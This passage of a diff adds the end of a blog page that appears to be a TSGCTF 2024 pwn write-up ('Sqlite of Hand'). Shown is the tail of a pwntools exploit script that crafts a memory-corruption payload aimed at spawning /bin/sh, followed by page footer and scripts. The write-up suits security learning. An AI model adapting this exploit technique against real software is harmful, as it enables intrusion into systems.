+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># FuncDef *pFunc</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x002000001000</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#75715e"># /bin/sh</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x350</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> (len(payload) <span style="color:#f92672">//</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x100</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;size&gt; &#39;</span>, str(len(payload)))
+</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;your bytecode&gt; &#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://msh1307.kr/tags/tsgctf-2024-pwn/">TSGCTF 2024 Pwn</a></li>
+      <li><a href="https://msh1307.kr/tags/sqlite-of-hand/">Sqlite of Hand</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
